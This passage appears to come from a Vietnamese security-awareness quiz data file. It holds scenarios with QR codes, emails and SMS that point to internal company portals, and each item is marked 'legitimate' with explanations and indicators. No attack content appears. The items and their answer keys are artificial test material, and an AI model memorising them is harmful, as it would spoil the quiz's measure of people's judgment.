          <span data-spot="safe" data-label="Chỉ xem thông tin, không phải đăng nhập">Quét để xem thực đơn tuần</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; standee đặt ngay tại bàn ăn căng tin là bối cảnh hợp lý">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://vps.com.vn/canteen/thuc-don-tuan. Đây là tên miền chính thức của công ty, trang chỉ hiển thị thực đơn và không đòi đăng nhập hay thông tin cá nhân.",
    indicators: [
      "Đúng tên miền chính thức vps.com.vn",
      "Chỉ xem thông tin, không phải đăng nhập",
      "Bối cảnh đặt mã hợp lý",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 52,
  },
  {
    id: "qr-safe-guest-wifi",
    title: "Mã QR hướng dẫn Wi-Fi khách",
    category: "QR",
    scenarioIntro: "Quầy lễ tân dán bảng hướng dẫn kết nối Wi-Fi cho khách kèm mã QR.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra confluence.vps.com.vn/it/huong-dan-wifi-khach - trang hướng dẫn trên tên miền công ty" class="qr-image" src="/assets/qr/qr-05.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Không yêu cầu tài khoản nội bộ">Quét để xem hướng dẫn Wi-Fi khách</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng hướng dẫn do lễ tân đặt là bối cảnh hợp lý">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://confluence.vps.com.vn/it/huong-dan-wifi-khach. Trang chỉ hướng dẫn cách kết nối, không yêu cầu tài khoản nội bộ hay mã OTP.",
    indicators: [
      "Đúng tên miền nội bộ confluence.vps.com.vn",
      "Không yêu cầu tài khoản nội bộ",
      "Nội dung đúng với mục đích hướng dẫn",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 53,
  },
  {
    id: "qr-safe-event-checkin",
    title: "Mã QR check-in townhall quý 4",
    category: "QR",
    scenarioIntro: "Ở cửa hội trường có bảng check-in sự kiện townhall quý 4 kèm mã QR.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra hrm.vps.com.vn/su-kien/townhall-q4 - cổng nhân sự nội bộ của công ty" class="qr-image" src="/assets/qr/qr-06.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Đúng bối cảnh sự kiện đang diễn ra">Quét để check-in townhall Q4</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng check-in ngay cửa hội trường khớp sự kiện đang diễn ra">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới http://hrm.vps.com.vn/su-kien/townhall-q4. Đây là cổng nhân sự nội bộ, chỉ ghi nhận check-in bằng tài khoản SSO đã đăng nhập sẵn.",
    indicators: [
      "Đúng cổng nhân sự nội bộ hrm.vps.com.vn",
      "Đúng bối cảnh sự kiện đang diễn ra",
      "Không hỏi mật khẩu hay OTP",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 54,
  },
  {
    id: "qr-safe-training-survey",
    title: "Mã QR khảo sát sau buổi đào tạo",
    category: "QR",
    scenarioIntro: "Kết thúc buổi đào tạo nội bộ, giảng viên chiếu mã QR khảo sát lên màn hình.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra vpslearn.vps.com.vn/khao-sat-sau-dao-tao - hệ thống đào tạo nội bộ" class="qr-image" src="/assets/qr/qr-07.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Chỉ thu thập ý kiến, không lấy thông tin nhạy cảm">Quét để đánh giá buổi đào tạo</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; mã chiếu cuối buổi học khớp bối cảnh khảo sát">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://vpslearn.vps.com.vn/khao-sat-sau-dao-tao. Đây là hệ thống đào tạo nội bộ, chỉ thu thập ý kiến về buổi học.",
    indicators: [
      "Đúng hệ thống đào tạo nội bộ vpslearn.vps.com.vn",
      "Chỉ thu thập ý kiến, không lấy thông tin nhạy cảm",
      "Xuất hiện đúng lúc kết thúc buổi học",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 55,
  },
  {
    id: "qr-safe-shuttle-schedule",
    title: "Mã QR lịch xe đưa đón nhân viên",
    category: "QR",
    scenarioIntro: "Bảng tin hành chính dán lịch xe đưa đón kèm mã QR xem bản cập nhật.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra confluence.vps.com.vn/hanh-chinh/lich-xe-dua-don - trang thông tin nội bộ" class="qr-image" src="/assets/qr/qr-08.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Chỉ hiển thị thông tin">Quét để xem lịch xe đưa đón</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng tin hành chính là nơi dán lịch xe hợp lý">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://confluence.vps.com.vn/hanh-chinh/lich-xe-dua-don. Trang chỉ hiển thị lịch trình, không có biểu mẫu đăng nhập.",
    indicators: [
      "Đúng tên miền nội bộ confluence.vps.com.vn",
      "Chỉ hiển thị thông tin",
      "Không có ô nhập tài khoản",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 56,
  },
  {
    id: "qr-safe-parking-register",
    title: "Mã QR đăng ký thẻ xe",
    category: "QR",
    scenarioIntro: "Phòng nhân sự gửi thông báo nội bộ kèm mã QR để đăng ký thẻ gửi xe.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra hrm.vps.com.vn/dang-ky-the-xe - cổng nhân sự nội bộ quen thuộc" class="qr-image" src="/assets/qr/qr-09.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Thông tin yêu cầu phù hợp mục đích">Quét để đăng ký thẻ gửi xe</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; thông báo do phòng nhân sự phát hành khớp thủ tục thẻ xe">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới http://hrm.vps.com.vn/dang-ky-the-xe. Đây là cổng nhân sự nội bộ, form chỉ hỏi biển số xe chứ không hỏi mật khẩu.",
    indicators: [
      "Đúng cổng nhân sự nội bộ hrm.vps.com.vn",
      "Thông tin yêu cầu phù hợp mục đích",
      "Không hỏi mật khẩu hay OTP",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 57,
  },
  {
    id: "qr-safe-printer-guide",
    title: "Mã QR hướng dẫn máy in tầng 5",
    category: "QR",
    scenarioIntro: "Bên cạnh máy in tầng 5 có dán mã QR hướng dẫn cài đặt.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra confluence.vps.com.vn/it/huong-dan-may-in-tang-5 - trang hướng dẫn trong kho tài liệu nội bộ" class="qr-image" src="/assets/qr/qr-10.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Nội dung đúng thiết bị đặt mã">Quét để xem hướng dẫn cài máy in</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; mã dán ngay cạnh máy in khớp nội dung hướng dẫn">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://confluence.vps.com.vn/it/huong-dan-may-in-tang-5. Trang thuộc kho tài liệu nội bộ và chỉ chứa hướng dẫn cài đặt.",
    indicators: [
      "Đúng kho tài liệu nội bộ confluence.vps.com.vn",
      "Nội dung đúng thiết bị đặt mã",
      "Không yêu cầu thông tin cá nhân",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 58,
  },
  {
    id: "qr-safe-meeting-docs",
    title: "Mã QR tài liệu họp ban điều hành",
    category: "QR",
    scenarioIntro: "Trong phòng họp, thư ký chiếu mã QR để mọi người tải tài liệu cuộc họp.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra confluence.vps.com.vn/hop-ban-dieu-hanh/tai-lieu - kho tài liệu nội bộ" class="qr-image" src="/assets/qr/qr-11.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Truy cập qua SSO sẵn có">Quét để mở tài liệu cuộc họp</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; mã do thư ký chiếu trong phòng họp khớp bối cảnh">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://confluence.vps.com.vn/hop-ban-dieu-hanh/tai-lieu. Kho tài liệu nội bộ này yêu cầu quyền truy cập sẵn có qua SSO, không yêu cầu nhập lại mật khẩu.",
    indicators: [
      "Đúng kho tài liệu nội bộ confluence.vps.com.vn",
      "Truy cập qua SSO sẵn có",
      "Đúng bối cảnh cuộc họp",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 59,
  },
  {
    id: "qr-safe-library-book",
    title: "Mã QR mượn sách thư viện nội bộ",
    category: "QR",
    scenarioIntro: "Kệ sách khu vực nghỉ có dán mã QR để đăng ký mượn sách.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra confluence.vps.com.vn/thu-vien/muon-sach - trang thư viện nội bộ" class="qr-image" src="/assets/qr/qr-12.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Mục đích khớp vị trí đặt mã">Quét để đăng ký mượn sách</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; mã dán trên kệ sách khớp mục đích mượn sách">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://confluence.vps.com.vn/thu-vien/muon-sach. Trang thuộc tên miền công ty và chỉ ghi nhận yêu cầu mượn sách.",
    indicators: [
      "Đúng tên miền nội bộ confluence.vps.com.vn",
      "Mục đích khớp vị trí đặt mã",
      "Không thu thập thông tin nhạy cảm",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 60,
  },
  {
    id: "qr-safe-blood-donation",
    title: "Mã QR đăng ký hiến máu công đoàn",
    category: "QR",
    scenarioIntro: "Công đoàn phát động chương trình hiến máu và dán poster kèm mã QR.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra hrm.vps.com.vn/phong-trao/hien-mau-2026 - trang phong trào trên cổng nhân sự" class="qr-image" src="/assets/qr/qr-13.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Không đòi đăng nhập hệ thống">Quét để đăng ký hiến máu</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; poster công đoàn khớp chương trình đang phát động">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới http://hrm.vps.com.vn/phong-trao/hien-mau-2026. Trang thuộc cổng nhân sự nội bộ, chỉ đăng ký tham gia.",
    indicators: [
      "Đúng cổng nhân sự nội bộ hrm.vps.com.vn",
      "Không đòi đăng nhập hệ thống",
      "Nội dung khớp chương trình đang diễn ra",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 61,
  },
  {
    id: "qr-safe-canteen-feedback",
    title: "Mã QR góp ý dịch vụ căng tin",
    category: "QR",
    scenarioIntro: "Ở quầy trả khay có bảng nhỏ mời góp ý dịch vụ căng tin qua mã QR.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra esm.vps.com.vn/gop-y-can-tin - biểu mẫu góp ý trên cổng hỗ trợ nội bộ" class="qr-image" src="/assets/qr/qr-14.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Có thể gửi ẩn danh">Quét để gửi góp ý căng tin</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng góp ý tại quầy trả khay là bối cảnh hợp lý">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://esm.vps.com.vn/gop-y-can-tin. Biểu mẫu trên cổng hỗ trợ nội bộ chỉ nhận ý kiến, có thể gửi ẩn danh.",
    indicators: [
      "Đúng cổng hỗ trợ nội bộ esm.vps.com.vn",
      "Có thể gửi ẩn danh",
      "Không yêu cầu tài khoản",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 62,
  },
  {
    id: "qr-safe-device-warranty",
    title: "Mã QR tra cứu bảo hành thiết bị",
    category: "QR",
    scenarioIntro: "Tem dán trên laptop cấp phát có mã QR tra cứu tình trạng bảo hành.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra esm.vps.com.vn/tra-cuu-bao-hanh - công cụ tra cứu của phòng IT" class="qr-image" src="/assets/qr/qr-15.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Chỉ tra cứu theo mã thiết bị">Quét để tra cứu bảo hành thiết bị</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; tem dán trên laptop cấp phát khớp mục đích tra cứu">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://esm.vps.com.vn/tra-cuu-bao-hanh. Trang chỉ tra cứu theo mã thiết bị, không yêu cầu thông tin đăng nhập.",
    indicators: [
      "Đúng cổng hỗ trợ nội bộ esm.vps.com.vn",
      "Chỉ tra cứu theo mã thiết bị",
      "Không yêu cầu mật khẩu",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 63,
  },
  {
    id: "qr-safe-office-map",
    title: "Mã QR sơ đồ tầng văn phòng",
    category: "QR",
    scenarioIntro: "Khu vực thang máy có bảng sơ đồ tầng kèm mã QR xem bản chi tiết.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra vps.com.vn/van-phong/so-do-tang - trang thông tin văn phòng" class="qr-image" src="/assets/qr/qr-16.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Chỉ hiển thị sơ đồ">Quét để xem sơ đồ tầng</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng sơ đồ khu thang máy là bối cảnh hợp lý">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới https://vps.com.vn/van-phong/so-do-tang. Trang chỉ hiển thị sơ đồ, hoàn toàn không thu thập dữ liệu.",
    indicators: [
      "Đúng tên miền chính thức vps.com.vn",
      "Chỉ hiển thị sơ đồ",
      "Không có biểu mẫu nào",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 64,
  },
  {
    id: "qr-safe-visitor-register",
    title: "Mã QR đăng ký khách đến làm việc",
    category: "QR",
    scenarioIntro: "Quầy lễ tân có bảng đăng ký khách kèm mã QR cho nhân viên khai báo trước.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra hrm.vps.com.vn/dang-ky-khach - hệ thống lễ tân nội bộ" class="qr-image" src="/assets/qr/qr-17.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Đúng quy trình đón khách">Quét để đăng ký khách đến làm việc</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; bảng đăng ký tại quầy lễ tân khớp quy trình đón khách">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới http://hrm.vps.com.vn/dang-ky-khach. Hệ thống lễ tân nội bộ chỉ ghi nhận thông tin khách mời, dùng SSO sẵn có.",
    indicators: [
      "Đúng cổng nhân sự nội bộ hrm.vps.com.vn",
      "Đúng quy trình đón khách",
      "Dùng SSO, không nhập lại mật khẩu",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 65,
  },
  {
    id: "qr-safe-health-check",
    title: "Mã QR đăng ký khám sức khỏe định kỳ",
    category: "QR",
    scenarioIntro: "Nhân sự dán thông báo khám sức khỏe định kỳ ở bảng tin kèm mã QR chọn lịch.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="safe" data-label="Quét ra hrm.vps.com.vn/kham-suc-khoe-dinh-ky - cổng nhân sự nội bộ" class="qr-image" src="/assets/qr/qr-18.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="safe" data-label="Chỉ chọn lịch, không nhập dữ liệu nhạy cảm">Quét để chọn lịch khám sức khỏe</span>
        </div>
        <p class="qr-hint" data-spot="safe" data-label="Quét trước để xem đường dẫn thật; thông báo trên bảng tin khớp đợt khám sức khỏe định kỳ">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Mã QR dẫn tới http://hrm.vps.com.vn/kham-suc-khoe-dinh-ky. Trang thuộc cổng nhân sự, chỉ cho chọn khung giờ khám.",
    indicators: [
      "Đúng cổng nhân sự nội bộ hrm.vps.com.vn",
      "Chỉ chọn lịch, không nhập dữ liệu nhạy cảm",
      "Khớp thông báo chính thức",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 66,
  },
  {
    id: "safe-email-hrm-profile",
    title: "Nhắc cập nhật thông tin cá nhân trên HRM",
    category: "Email",
    scenarioIntro: "Phòng Nhân sự gửi email nhắc rà soát thông tin cá nhân trước kỳ chốt hồ sơ.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> Phòng Nhân sự &lt;nhansu@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Rà soát thông tin cá nhân trước 30/11</div>
        <p>Anh/chị vui lòng đăng nhập cổng nhân sự để kiểm tra số điện thoại, địa chỉ và người liên hệ khẩn cấp.</p>
        <p data-spot="safe" data-label="Đường dẫn trỏ đúng cổng nhân sự nội bộ hrm.vps.com.vn">Cập nhật tại: <a href="http://hrm.vps.com.vn/" title="http://hrm.vps.com.vn/">hrm.vps.com.vn</a></p>
        <p data-spot="safe" data-label="Email không hỏi mật khẩu, OTP hay đính kèm biểu mẫu lạ">Email không yêu cầu cung cấp mật khẩu hay mã OTP qua thư.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Email đến từ tên miền nội bộ vps.com.vn và hướng dẫn thao tác ngay trên cổng nhân sự chính thức http://hrm.vps.com.vn/. Không có yêu cầu mật khẩu, OTP hay tệp đính kèm lạ.",
    indicators: [
      "Người gửi thuộc tên miền nội bộ vps.com.vn",
      "Liên kết trỏ đúng hệ thống nhân sự hrm.vps.com.vn",
      "Không hỏi mật khẩu hoặc OTP qua email",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 67,
  },
  {
    id: "safe-email-jira-assign",
    title: "Thông báo giao việc từ Jira",
    category: "Email",
    scenarioIntro: "Bạn nhận được thông báo tự động khi được giao một task mới.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> <span data-spot="safe" data-label="Người gửi thuộc hệ thống quản lý công việc nội bộ jira.vps.com.vn">Jira &lt;no-reply@jira.vps.com.vn&gt;</span></div>
        <div class="mail-row"><strong>Subject:</strong> [SEC-1428] Bạn được giao: Rà soát log firewall tuần 47</div>
        <p data-spot="safe" data-label="Nội dung khớp quy trình giao việc hằng ngày, có mã task và người giao cụ thể">Nguyễn Minh đã giao task <strong>SEC-1428</strong> cho bạn, hạn xử lý 22/11.</p>
        <p data-spot="safe" data-label="Liên kết trỏ đúng hệ thống quản lý công việc jira.vps.com.vn">Mở task: <a href="https://jira.vps.com.vn/browse/SEC-1428" title="https://jira.vps.com.vn/browse/SEC-1428">jira.vps.com.vn/browse/SEC-1428</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Thông báo đến từ hệ thống Jira nội bộ (jira.vps.com.vn), nội dung khớp quy trình giao việc và liên kết trỏ đúng task trên cùng tên miền.",
    indicators: [
      "Người gửi và liên kết cùng thuộc jira.vps.com.vn",
      "Nội dung khớp quy trình giao việc hằng ngày",
      "Không yêu cầu đăng nhập lại hay cung cấp thông tin",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 68,
  },
  {
    id: "safe-email-confluence-doc",
    title: "Chia sẻ tài liệu họp trên Confluence",
    category: "Email",
    scenarioIntro: "Thư ký cuộc họp chia sẻ biên bản qua hệ thống tài liệu nội bộ.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> <span data-spot="safe" data-label="Người gửi thuộc kho tài liệu nội bộ confluence.vps.com.vn">Confluence &lt;no-reply@confluence.vps.com.vn&gt;</span></div>
        <div class="mail-row"><strong>Subject:</strong> Trần Lan đã chia sẻ trang "Biên bản họp vận hành T11"</div>
        <p data-spot="safe" data-label="Khớp cuộc họp vừa diễn ra, không đính kèm tệp lạ và không hỏi thông tin">Trang tài liệu đã được chia sẻ với nhóm Vận hành.</p>
        <p data-spot="safe" data-label="Liên kết trỏ đúng kho tài liệu nội bộ confluence.vps.com.vn">Xem tài liệu: <a href="https://confluence.vps.com.vn/van-hanh/bien-ban-t11" title="https://confluence.vps.com.vn/van-hanh/bien-ban-t11">confluence.vps.com.vn/van-hanh/bien-ban-t11</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Đây là thông báo chia sẻ tài liệu từ Confluence nội bộ. Người gửi và liên kết đều thuộc confluence.vps.com.vn, truy cập bằng phiên đăng nhập sẵn có.",
    indicators: [
      "Tên miền tài liệu nội bộ confluence.vps.com.vn",
      "Nội dung khớp cuộc họp vừa diễn ra",
      "Không đính kèm tệp lạ, không hỏi thông tin",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 69,
  },
  {
    id: "safe-email-esm-ticket",
    title: "Yêu cầu hỗ trợ đã được xử lý trên ESM",
    category: "Email",
    scenarioIntro: "Bạn từng gửi yêu cầu hỗ trợ IT và nay nhận được email cập nhật trạng thái.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> ESM Service Desk &lt;no-reply@esm.vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> [ESM-90421] Yêu cầu cấp quyền VPN đã hoàn tất</div>
        <p>Yêu cầu bạn tạo ngày 18/11 đã được xử lý xong.</p>
        <p data-spot="safe" data-label="Liên kết trỏ đúng cổng hỗ trợ người dùng esm.vps.com.vn">Xem chi tiết: <a href="https://esm.vps.com.vn/ticket/ESM-90421" title="https://esm.vps.com.vn/ticket/ESM-90421">esm.vps.com.vn/ticket/ESM-90421</a></p>
        <p data-spot="safe" data-label="Email chỉ báo trạng thái, không yêu cầu thao tác nhạy cảm">Nếu cần mở lại yêu cầu, phản hồi trực tiếp trên cổng ESM.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Email là thông báo trạng thái từ cổng hỗ trợ người dùng esm.vps.com.vn, khớp với yêu cầu bạn đã tạo trước đó và không đòi hỏi thông tin đăng nhập.",
    indicators: [
      "Tên miền hỗ trợ nội bộ esm.vps.com.vn",
      "Khớp với yêu cầu bạn thực sự đã gửi",
      "Chỉ thông báo trạng thái, không yêu cầu nhập liệu",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 70,
  },
  {
    id: "safe-email-vpslearn-course",
    title: "Xác nhận ghi danh khóa đào tạo trên vpsLearn",
    category: "Email",
    scenarioIntro: "Bạn vừa đăng ký khóa đào tạo nhận thức an toàn thông tin.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row"><strong>From:</strong> <span data-spot="safe" data-label="Người gửi thuộc hệ thống đào tạo nội bộ vpslearn.vps.com.vn">vpsLearn &lt;no-reply@vpslearn.vps.com.vn&gt;</span></div>
        <div class="mail-row"><strong>Subject:</strong> Xác nhận ghi danh: An toàn thông tin cơ bản (khai giảng 02/12)</div>
        <p data-spot="safe" data-label="Khớp hành động ghi danh bạn vừa thực hiện, không yêu cầu thanh toán">Bạn đã ghi danh thành công. Khóa học gồm 4 buổi, có thể học lại bản ghi trong 30 ngày.</p>
        <p data-spot="safe" data-label="Liên kết trỏ đúng hệ thống đào tạo vpslearn.vps.com.vn">Vào lớp: <a href="https://vpslearn.vps.com.vn/khoa-hoc/attt-co-ban" title="https://vpslearn.vps.com.vn/khoa-hoc/attt-co-ban">vpslearn.vps.com.vn/khoa-hoc/attt-co-ban</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Thư xác nhận từ hệ thống đào tạo nội bộ vpslearn.vps.com.vn, khớp với hành động ghi danh bạn vừa thực hiện và không yêu cầu thanh toán hay thông tin cá nhân.",
    indicators: [
      "Tên miền đào tạo nội bộ vpslearn.vps.com.vn",
      "Khớp với việc bạn vừa đăng ký",
      "Không yêu cầu thanh toán hay dữ liệu nhạy cảm",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 71,
  },
  {
    id: "safe-sms-esm-ticket",
    title: "SMS cập nhật yêu cầu hỗ trợ",
    category: "SMS",
    scenarioIntro: "Bạn đang chờ xử lý một yêu cầu hỗ trợ IT.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="phone-sim">
        <div class="phone-frame">
          <div class="phone-status"><span>09:15</span><span>4G 78%</span></div>
          <div class="phone-header">
            <div class="phone-avatar">V</div>
            <div><strong>VPS ESM</strong><span>SMS</span></div>
          </div>
          <div class="message-thread">
            <div class="message-bubble inbound">
              <p data-spot="safe" data-label="Chỉ thông báo trạng thái yêu cầu bạn đã tự tạo, không kèm liên kết">VPS ESM: Yeu cau ESM-90421 cua ban da duoc tiep nhan, du kien xu ly trong 24h.</p>
              <p data-spot="safe" data-label="Hướng dẫn tự vào cổng nội bộ và nhắc không chia sẻ OTP">Theo doi tien do tren cong ESM noi bo. VPS khong bao gio hoi OTP qua tin nhan.</p>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn chỉ thông báo trạng thái yêu cầu hỗ trợ, không kèm đường dẫn lạ và còn nhắc không chia sẻ OTP - đúng cách hệ thống nội bộ liên hệ.",
    indicators: [
      "Chỉ thông báo trạng thái",
      "Không có liên kết lạ",
      "Nhắc nhở không chia sẻ OTP",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 72,
  },
  {
    id: "safe-sms-vpslearn-remind",
